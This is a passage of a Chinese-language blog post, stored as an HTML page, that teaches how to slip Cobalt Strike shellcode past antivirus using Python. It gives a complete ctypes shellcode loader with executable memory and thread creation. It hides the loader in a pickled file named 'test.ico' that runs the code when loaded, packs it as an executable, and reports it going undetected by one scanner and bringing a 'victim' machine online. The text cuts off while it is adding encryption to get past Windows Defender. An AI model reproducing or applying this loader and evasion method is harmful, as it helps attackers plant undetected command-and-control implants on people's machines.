@@ -1,0 +1,566 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="theme-color" content="#3367D6"/>
+  <link rel="apple-touch-icon" href="/icons-192.png">
+  <link rel="manifest" href="/manifest.json">
+  
+  <meta name="generator" content="Hexo 6.3.0">
+
+  
+
+  
+
+  
+    <meta name="author" content="John Doe">
+  
+
+  
+
+  
+
+  <title>Hexo</title>
+
+  
+
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+
+  <!--mathjax latex数学公式显示支持-->
+  
+  
+
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@1.1.13/index.min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.7.0/build/styles/monokai.min.css">
+  
+
+  
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+</head>
+<body>
+  <div class="root-container">
+    
+<!-- header container -->
+<header class="header-container post">
+  
+    <div class="post-image" style="background-image: url(https://qiniu.sukoshi.xyz/src/images/68686407_p0.jpg)"></div>
+  
+
+  <!-- navbar -->
+<nav class="navbar">
+  <div class="navbar-content">
+    <!-- logo -->
+    <div class="navbar-logo">
+      <a href="/">
+        
+          Hexo
+        
+      </a>
+    </div>
+    <!-- link -->
+    <div class="navbar-link">
+      <div class="navbar-btn">
+        <div></div>
+        <div></div>
+        <div></div>
+      </div>
+      <ul class="navbar-list">
+        
+          <li class="navbar-list-item"><a href="/">首页</a></li>
+        
+          <li class="navbar-list-item"><a href="/links">友链</a></li>
+        
+          <li class="navbar-list-item"><a href="/about">关于</a></li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+    <div class="header-content">
+      <div class="post-text layout-block">
+        <div class="layout-margin">
+          <h1 class="title-wrap"></h1>
+          <h2 class="title-sub-wrap">
+            <strong>John Doe</strong>
+            <span>发布于</span>
+            <time  class="article-date" datetime="2023-10-22T08:51:11.590Z" itemprop="datePublished">2023-10-22</time>
+          </h2>
+          
+            <h2 class="last-time">
+              <span>最后更新于</span>
+              <time  class="article-updated" datetime="2023-08-25T18:09:52.000Z" itemprop="dateUpdated">2023-08-26</time>
+            </h2>
+          
+          
+          <ul class="wrap-list dark">
+  
+</ul>
+          <ul class="wrap-list dark">
+  
+</ul>
+        </div>
+      </div>
+    </div>
+  
+
+  
+  
+  
+</header>
+
+    <!-- 文章 -->
+
+<!-- 文章内容 -->
+<div class="body-container">
+  <article class="content-container layout-block post-container">
+    <div class="article-info">
+      
+      
+      
+      
+      <section class="article-entry markdown-body layout-margin content-padding--large soft-size--large soft-style--box">
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本篇文章主要用到python来对CobaltStrike生成的Shellcode进行分离免杀处理, 因此要求读者要有一定的python基础, 下面我会介绍pyhon反序列化免杀所需用到的相关函数和库</p>
+<h2 id="exec函数"><a href="#exec函数" class="headerlink" title="exec函数"></a>exec函数</h2><p><code>exec</code>函数是python的内置函数, 其功能与eval()函数相同, 但不同的是exec函数支持多行python代码的执行, 而eval()函数仅支持单行</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;&quot;&quot;String = &quot;HelloWorld&quot;</span></span><br><span class="line"><span class="string">print(String)&quot;&quot;&quot;</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment">#在上述的exec执行的python代码中定义了String变量,因此能进行输出</span></span><br><span class="line"><span class="built_in">print</span>(String) </span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">代码执行结果:</span></span><br><span class="line"><span class="string">HelloWorld</span></span><br><span class="line"><span class="string">HelloWorld</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="pickle模块"><a href="#pickle模块" class="headerlink" title="pickle模块"></a>pickle模块</h2><p>pickle模块能实现任意对象与文本之间的相互转换, 也可实现任意对象和二进制之间的相互转换, 也就是说pickle能实现python对象的存储及恢复</p>
+<p>python中几乎所有的数据类型(列表,字典,集合,类等等)都可以用pickle来序列化, 序列化的数据可读性差且难识别, 通常用于存储数据</p>
+<h3 id="pickle-dumps-obj"><a href="#pickle-dumps-obj" class="headerlink" title="pickle.dumps(obj)"></a><code>pickle.dumps(obj)</code></h3><p>dumps功能将数据转换成只有python语言认识的字符串</p>
+<ul>
+<li>参数<code>obj</code>: 要封装的对象</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line">data = [<span class="string">&#x27;henry&#x27;</span>,<span class="string">&#x27;helloworld&#x27;</span>,<span class="number">123</span>]</span><br><span class="line">p_str = pickle.dumps(data)</span><br><span class="line"><span class="built_in">print</span>(p_str)</span><br><span class="line"><span class="comment">#输出b&#x27;\x80\x04\x95\x1c\x00\x00\x00\x00\x00\x00\x00]\x94(\x8c\x05henry\x94\x8c\nhelloworld\x94K&#123;e.&#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="pickle-loads-bytes-obj"><a href="#pickle-loads-bytes-obj" class="headerlink" title="pickle.loads(bytes_obj)"></a><code>pickle.loads(bytes_obj)</code></h3><p>loads功能将pickle数据转换成python的数据结构</p>
+<ul>
+<li>参数<code>bytes_obj</code>: <code>pickle_dumps</code>后的数据对象</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line">data = [<span class="string">&#x27;henry&#x27;</span>,<span class="string">&#x27;helloworld&#x27;</span>,<span class="number">123</span>]</span><br><span class="line">p_str = pickle.dumps(data)</span><br><span class="line"><span class="built_in">print</span>(p_str)</span><br><span class="line"></span><br><span class="line"><span class="built_in">str</span> = pickle.loads(p_str)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>)</span><br><span class="line"><span class="comment">#输出:[&#x27;henry&#x27;, &#x27;helloworld&#x27;, 123]</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="pickle-dump-obj-file-protocol"><a href="#pickle-dump-obj-file-protocol" class="headerlink" title="pickle.dump(obj,file,[protocol])"></a><code>pickle.dump(obj,file,[protocol])</code></h3><p>序列化对象, 并将结果数据流写入文件file中</p>
+<ul>
+<li><p>必填参数<code>obj</code>: 将要封装的对象</p>
+</li>
+<li><p>必填参数<code>file</code>: 要写入的文件对象, file必须以二进制模式打开</p>
+</li>
+<li><p>参数<code>protocol</code>: 代表序列化模式, 默认值为0, 表示以文本的形式进行序列化, protocol的值为1或2时表示以二进制的形式序列化</p>
+</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line">data = [<span class="string">&#x27;henry&#x27;</span>,<span class="string">&#x27;helloworld&#x27;</span>,<span class="number">123</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;dump.txt&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    pickle.dump(data,file)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;dump.txt&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    <span class="built_in">print</span>(file.read()) <span class="comment">#输出:b&#x27;\x80\x04\x95\x1c\x00\x00\x00\x00\x00\x00\x00]\x94(\x8c\x05henry\x94\x8c\nhelloworld\x94K&#123;e.&#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="pickle-load-file"><a href="#pickle-load-file" class="headerlink" title="pickle.load(file)"></a><code>pickle.load(file)</code></h3><p>反序列化对象, 将文件中的数据解析为一个python对象</p>
+<ul>
+<li>必填参数<code>file</code>: 存有pickle数据的文件对象</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line">data = [<span class="string">&#x27;henry&#x27;</span>,<span class="string">&#x27;helloworld&#x27;</span>,<span class="number">123</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;dump.txt&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    pickle.dump(data,file)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;dump.txt&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    <span class="built_in">print</span>(pickle.load(file)) <span class="comment">#输出:[&#x27;henry&#x27;, &#x27;helloworld&#x27;, 123]</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="类特殊方法-reduce"><a href="#类特殊方法-reduce" class="headerlink" title="类特殊方法:__reduce__"></a>类特殊方法:<code>__reduce__</code></h2><p>当定义扩展类型时(即使用python的C语言API实现的类型), 若你想pickle这些类型, 你必须告诉python如何去pickle</p>
+<p><code>__reduce__</code>方法在类中被定义后, 当对象被pickle时就会被调用, 它要么返回一个代表全局名称的字符串, python会查找此字符串并pickle; 要么返回一个元组, 此元组包含2到5个元素, 第一个元素为可调用的对象, 用于重建对象时调用; 第二个元素是参数元素(必须为元组), 供可调用对象(第一个元素)使用; 另外三个元素分别是: 被传递给<code>__setstate__</code>的状态(可选)、一个产生被pickle的列表元素的迭代器(可选)、一个产生被pickle的字典元素的迭代器(可选)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line">shellcode = <span class="string">&quot;list1 = [1,2,3,4]&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">   <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">       <span class="keyword">return</span> (<span class="built_in">exec</span>,(shellcode,))</span><br><span class="line"></span><br><span class="line"><span class="comment">#当实例对象被pickle后,则会调用特殊方法__reduce__,所以下列代码相当于pickle.dumps((exec,(shellcode,)))</span></span><br><span class="line">ret = pickle.dumps(A())</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(ret)</span><br><span class="line"><span class="comment">#输出:b&#x27;\x80\x04\x95-\x00\x00\x00\x00\x00\x00\x00\x8c\x08builtins\x94\x8c\x04exec\x94\x93\x94\x8c\x11list1 = [1,2,3,4]\x94\x85\x94R\x94.&#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Cryptography"><a href="#Cryptography" class="headerlink" title="Cryptography"></a>Cryptography</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>Cryptography是python语言中非常著名的加解密库，在算法层面提供了高层次的抽象，使用起来非常简单、直观，同时还保留了各种不同算法的低级别接口，保留灵活性</p>
+<p>我们知道加密一般分为对称加密(Symmetric Key Encryption)和非对称加密(Asymmetric Key Encryption)。各自对应多种不同的算法，每种算法又有不同的密钥位长要求，另外还涉及到不同的分组加密模式，以及末尾补齐方式。因此需要高层次的抽象，把这些参数封装起来，让我们使用时，不用关心这么多参数，只要知道这么用足够安全就够了</p>
+<p>对称加密又分为分组加密和序列加密，本文只讨论对称分组加密</p>
+<ul>
+<li>主流对称分组加密算法：DES、3DES、AES</li>
+<li>主流对称分组加密模式：ECB、CBC、CFB、OFB</li>
+<li>主流填充标准：PKCS7、ISO 10126、ANSI X.923、Zero padding</li>
+</ul>
+<p>在cryptography库中，对称加密算法的抽象是fernet模块，包括了对数据的加解密以及签名验证功能，以及密钥过期机制，该模块采用了如下定义：</p>
+<ul>
+<li>加解密算法为AES，密钥位长128，CBC模式，填充标准PKCS7</li>
+<li>签名算法为SHA256的HMAC，密钥位长128位</li>
+<li>密钥可以设置过期时间</li>
+</ul>
+<h3 id="使用实例"><a href="#使用实例" class="headerlink" title="使用实例"></a>使用实例</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> cryptography.fernet <span class="keyword">import</span> Fernet</span><br><span class="line"></span><br><span class="line">String = <span class="string">b&quot;Hello World&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#生成密钥</span></span><br><span class="line">key = Fernet.generate_key()</span><br><span class="line"><span class="built_in">print</span>(key) <span class="comment">#输出key: b&#x27;wmCNyvzUekp_JWEHUcTy4vS2qMrWDXbKOfTooYD1WiI=&#x27;</span></span><br><span class="line">f_obj = Fernet(key) <span class="comment">#定义一个用于实现加密和解密方法的对象</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#进行加密</span></span><br><span class="line">encrypt_String = f_obj.encrypt(String)</span><br><span class="line"><span class="built_in">print</span>(encrypt_String) <span class="comment">#输出加密后的内容: b&#x27;gAAAAABjetNK7sjOoosLI-KcPGdwvQQJVnhwYR9JIeGUx3hJ3qKOQXkaKiGgrlj8wr-tMZdhFKcoK75oONPP4rEDVna5cITQ9g==&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#进行解密</span></span><br><span class="line">decrypt_String = f_obj.decrypt(encrypt_String)</span><br><span class="line"><span class="built_in">print</span>(decrypt_String) <span class="comment">#输出解密后的内容: b&#x27;Hello World&#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Ctypes库"><a href="#Ctypes库" class="headerlink" title="Ctypes库"></a>Ctypes库</h2><p>Ctypes 是 Python 的外部函数库。提供了与 C 兼容的数据类型，并允许调用 DLL 或共享库中的函数。可使用该模块以纯 Python 形式对这些库进行封装</p>
+<p>而本编文章主要调用系统DLL的函数有<code>VirtualAlloc</code>、<code>RtlMoveMemory</code>、<code>CreateThread</code>、<code>WaitForSingleObject</code>, 这些函数后文都会讲述</p>
+<h1 id="ShellCode加载器"><a href="#ShellCode加载器" class="headerlink" title="ShellCode加载器"></a>ShellCode加载器</h1><h2 id="实现思路"><a href="#实现思路" class="headerlink" title="实现思路"></a>实现思路</h2><p>要实现所谓的Shellcode加载器, 其实只需以下四个步骤:</p>
+<ul>
+<li><code>VirtualAlloc</code>函数开辟内存空间</li>
+<li><code>RtlMoveMemory</code>函数将Shellcode加载至此内存空间</li>
+<li><code>CreateThread</code>创建线程执行此段内存空间的内容</li>
+<li><code>WaitForSingleObject</code>等待ShellCode执行结束</li>
+</ul>
+<h2 id="加载代码"><a href="#加载代码" class="headerlink" title="加载代码"></a>加载代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line"><span class="comment">#CobaltStrike生成的PythonShellcode代码,注意双引号前有个b</span></span><br><span class="line">bytesbuf = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#bytearray()函数返回一个新字节数组</span></span><br><span class="line">shellcode= <span class="built_in">bytearray</span>(bytesbuf)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#VirtualAlloc函数用来开辟内存空间,返回类型为ctypes.c_uint64</span></span><br><span class="line">ctypes.windll.kernel32.VirtualAlloc.restype= ctypes.c_uint64</span><br><span class="line">ptr= ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>),ctypes.c_int(<span class="built_in">len</span>(shellcode)), ctypes.c_int(<span class="number">0x3000</span>),ctypes.c_int(<span class="number">0x40</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#RtlMoveMemory函数将Shellcode加载至此段内存空间</span></span><br><span class="line">buf= (ctypes.c_char *<span class="built_in">len</span>(shellcode)).from_buffer(shellcode)</span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(</span><br><span class="line">   ctypes.c_uint64(ptr),</span><br><span class="line">   buf,</span><br><span class="line">   ctypes.c_int(<span class="built_in">len</span>(shellcode))</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">#使用CreateThread函数创建一个线程从Shellcode的起始地址开始执行此段内存空间的内容</span></span><br><span class="line">handle= ctypes.windll.kernel32.CreateThread(</span><br><span class="line">   ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">   ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">   ctypes.c_uint64(ptr),</span><br><span class="line">   ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">   ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">   ctypes.pointer(ctypes.c_int(<span class="number">0</span>))</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">#通过WaitForSingleObject函数来等待执行结束</span></span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-<span class="number">1</span>))</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="运行测试"><a href="#运行测试" class="headerlink" title="运行测试"></a>运行测试</h2><p>使用火绒扫描Shellcode加载器, 结果可想而知报毒了, 所以更不用说打包成可执行文件了, 因此需要对加载器代码进行反序列化处理</p>
+<p><img src="/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%8D%E6%9D%80/image-20221119213252111.png" alt="image-20221119213252111"></p>
+<p>​	</p>
+<h1 id="简单的反序列化免杀"><a href="#简单的反序列化免杀" class="headerlink" title="简单的反序列化免杀"></a>简单的反序列化免杀</h1><h2 id="项目代码"><a href="#项目代码" class="headerlink" title="项目代码"></a>项目代码</h2><h3 id="GenerateShellcode-py"><a href="#GenerateShellcode-py" class="headerlink" title="GenerateShellcode.py"></a>GenerateShellcode.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#将下述的代码替换成CobaltStrike的Shellcode</span></span><br><span class="line">shellcode = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;shellcode.txt&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(shellcode) </span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="PickleDump-py"><a href="#PickleDump-py" class="headerlink" title="PickleDump.py"></a>PickleDump.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#pickle dump</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">shellcode=<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">import ctypes</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">f= open(&#x27;shellcode.txt&#x27;, &#x27;rb&#x27;)</span></span><br><span class="line"><span class="string">shellcode= f.read()</span></span><br><span class="line"><span class="string">shellcode= bytearray(shellcode)</span></span><br><span class="line"><span class="string">ctypes.windll.kernel32.VirtualAlloc.restype= ctypes.c_uint64</span></span><br><span class="line"><span class="string">ptr= ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000),ctypes.c_int(0x40))</span></span><br><span class="line"><span class="string">buf= (ctypes.c_char *len(shellcode)).from_buffer(shellcode)</span></span><br><span class="line"><span class="string">ctypes.windll.kernel32.RtlMoveMemory(</span></span><br><span class="line"><span class="string">   ctypes.c_uint64(ptr),</span></span><br><span class="line"><span class="string">   buf,</span></span><br><span class="line"><span class="string">   ctypes.c_int(len(shellcode))</span></span><br><span class="line"><span class="string">)</span></span><br><span class="line"><span class="string">handle= ctypes.windll.kernel32.CreateThread(</span></span><br><span class="line"><span class="string">   ctypes.c_int(0),</span></span><br><span class="line"><span class="string">   ctypes.c_int(0),</span></span><br><span class="line"><span class="string">   ctypes.c_uint64(ptr),</span></span><br><span class="line"><span class="string">   ctypes.c_int(0),</span></span><br><span class="line"><span class="string">   ctypes.c_int(0),</span></span><br><span class="line"><span class="string">   ctypes.pointer(ctypes.c_int(0))</span></span><br><span class="line"><span class="string">)</span></span><br><span class="line"><span class="string">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">   <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">       <span class="keyword">return</span>(<span class="built_in">exec</span>,(shellcode,))</span><br><span class="line"></span><br><span class="line">ret=pickle.dumps(A())</span><br><span class="line"></span><br><span class="line"><span class="comment">#将pickle后的数据写入test.ico文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;test.ico&quot;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">   file.write(ret)</span><br></pre></td></tr></table></figure>
+
+<p>​	</p>
+<h3 id="PickleLoad-py"><a href="#PickleLoad-py" class="headerlink" title="PickleLoad.py"></a>PickleLoad.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line">temp=<span class="built_in">open</span>(<span class="string">&quot;test.ico&quot;</span>,<span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">shellcode=pickle.loads(temp)  <span class="comment">#将pickle数据转换成python数据结构,以此能够执行python代码</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="运行测试-1"><a href="#运行测试-1" class="headerlink" title="运行测试"></a>运行测试</h2><p>先执行<code>GenerateShellcode.py</code>生成<code>shellcode.txt</code>文件, 再执行<code>PickleDump.py</code>生成<code>test.ico</code>文件, 用火绒扫描下这两个文件, 没有报毒, 但是WindowsDefender报毒了, 不过没关系, 后文我会通过对这两个文件加密来绕过WindowsDefender</p>
+<img src="Python反序列化免杀/image-20221119222504696.png" alt="image-20221119222504696" style="zoom:67%;" />
+
+<p>​	</p>
+<p>使用pyinstall将<code>PickleLoad.py</code>打包成可执行文件, 在项目文件打开终端执行如下命令:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pyinstall.exe -F PickleLoad.py</span><br></pre></td></tr></table></figure>
+
+<p><img src="/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%8D%E6%9D%80/image-20221119220335934.png" alt="image-20221119220335934"></p>
+<p>随后会在项目文件的dist目录生成可执行文件, 使用火绒杀毒测试下, 可以发现未报毒</p>
+<p><img src="/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%8D%E6%9D%80/image-20221119220513513.png" alt="image-20221119220513513">	</p>
+<p>将<code>PickleLoad.exe</code>、<code>shellcode.txt</code>、<code>test.ico</code>文件放到同一目录下, 随后运行PickleLoad.exe会弹出一个窗口, CS显示上线</p>
+<blockquote>
+<p>若此窗口关闭了, 则受害机在CS下线</p>
+</blockquote>
+<p><img src="/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%8D%E6%9D%80/image-20221119225217122.png" alt="image-20221119225217122"></p>
+<p><img src="/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%8D%E6%9D%80/image-20221119225258224.png" alt="image-20221119225258224"></p>
+<h1 id="加密后的反序列化免杀"><a href="#加密后的反序列化免杀" class="headerlink" title="加密后的反序列化免杀"></a>加密后的反序列化免杀</h1><h2 id="项目代码-1"><a href="#项目代码-1" class="headerlink" title="项目代码"></a>项目代码</h2><h3 id="GenerateShellcode-py-1"><a href="#GenerateShellcode-py-1" class="headerlink" title="GenerateShellcode.py"></a>GenerateShellcode.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">shellcode = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;shellcode.txt&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(shellcode)</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="encrypt-py"><a href="#encrypt-py" class="headerlink" title="encrypt.py"></a>encrypt.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#对静态文件进行加密</span></span><br><span class="line"><span class="keyword">from</span> cryptography.fernet <span class="keyword">import</span> Fernet</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">EncryptTXT</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        key = Fernet.generate_key()</span><br><span class="line">        f = Fernet(key)</span><br><span class="line">        enc_pay = f.encrypt(<span class="built_in">bytes</span>(<span class="built_in">bytearray</span>(file.read())))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;Encrypt_shellcode.txt&quot;</span>,<span class="string">&#x27;w+&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        file.write(enc_pay.decode())</span><br><span class="line">        <span 